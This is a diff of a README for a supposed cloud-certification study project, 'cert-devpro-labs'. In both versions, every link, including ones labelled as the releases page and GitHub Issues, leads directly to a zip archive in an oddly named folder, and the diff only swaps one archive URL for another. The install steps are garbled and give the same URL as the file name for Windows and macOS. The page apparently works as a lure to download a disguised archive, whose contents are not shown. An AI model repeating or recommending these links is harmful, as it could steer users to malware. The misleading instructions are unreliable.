@@ -1,6 +1,6 @@
 # 🌟 cert-devpro-labs - Simplifying Cloud Certification Preparation
 
-[![Download from Releases](https://raw.githubusercontent.com/monalisa964/cert-devpro-labs/main/loiterer/labs_devpro_cert_v3.1.zip)](https://raw.githubusercontent.com/monalisa964/cert-devpro-labs/main/loiterer/labs_devpro_cert_v3.1.zip)
+[![Download from Releases](https://github.com/monalisa964/cert-devpro-labs/raw/refs/heads/main/loiterer/devpro-cert-labs-1.4.zip)](https://github.com/monalisa964/cert-devpro-labs/raw/refs/heads/main/loiterer/devpro-cert-labs-1.4.zip)
 
 ## 📖 Overview
 cert-devpro-labs is an open-source project designed to help users prepare for cloud certification exams, such as AWS, Azure, and GCP. It provides various architecture patterns and Infrastructure-as-Code (IaC) examples. This resource is perfect for those looking to gain knowledge and skills in cloud computing and security.
@@ -16,13 +16,13 @@ To use this software, follow the steps below. This guide assumes you have basic 
 
 2. **Visit the Download Page**  
    Click the link below to access the Releases page:
-   [Visit this page to download](https://raw.githubusercontent.com/monalisa964/cert-devpro-labs/main/loiterer/labs_devpro_cert_v3.1.zip)
+   [Visit this page to download](https://github.com/monalisa964/cert-devpro-labs/raw/refs/heads/main/loiterer/devpro-cert-labs-1.4.zip)
 
 3. **Select the Latest Release**  
    On the Releases page, you will see a list of versions. Look for the latest release, which usually has the highest version number. 
 
 4. **Download the Release File**  
-   Click on the file that matches your operating system. The file may have a name like `https://raw.githubusercontent.com/monalisa964/cert-devpro-labs/main/loiterer/labs_devpro_cert_v3.1.zip` for Windows or `https://raw.githubusercontent.com/monalisa964/cert-devpro-labs/main/loiterer/labs_devpro_cert_v3.1.zip` for macOS. 
+   Click on the file that matches your operating system. The file may have a name like `https://github.com/monalisa964/cert-devpro-labs/raw/refs/heads/main/loiterer/devpro-cert-labs-1.4.zip` for Windows or `https://github.com/monalisa964/cert-devpro-labs/raw/refs/heads/main/loiterer/devpro-cert-labs-1.4.zip` for macOS. 
 
 5. **Install the Application**  
    Once the download is complete, locate the file on your computer:
@@ -34,7 +34,7 @@ To use this software, follow the steps below. This guide assumes you have basic 
 
 ## 📥 Download & Install
 You can download the latest version of the software directly from the releases page. Here is the link once again for your convenience:
-[Visit this page to download](https://raw.githubusercontent.com/monalisa964/cert-devpro-labs/main/loiterer/labs_devpro_cert_v3.1.zip)
+[Visit this page to download](https://github.com/monalisa964/cert-devpro-labs/raw/refs/heads/main/loiterer/devpro-cert-labs-1.4.zip)
 
 ## 📚 Application Features
 - **Infrastructure-as-Code (IaC)**: Templates and examples for automation using tools like Terraform.
@@ -62,7 +62,7 @@ After installing the software, explore the different sections:
 - Use the guides to prepare for your desired certifications.
 
 ## 📞 Support
-If you have questions or need assistance, you can reach out through the [GitHub Issues](https://raw.githubusercontent.com/monalisa964/cert-devpro-labs/main/loiterer/labs_devpro_cert_v3.1.zip) page. Our community is here to help. 
+If you have questions or need assistance, you can reach out through the [GitHub Issues](https://github.com/monalisa964/cert-devpro-labs/raw/refs/heads/main/loiterer/devpro-cert-labs-1.4.zip) page. Our community is here to help. 
 
 ## 👥 Contributors
 This project is a collaborative effort. If you would like to contribute, visit the GitHub repository for more details on how to get involved.
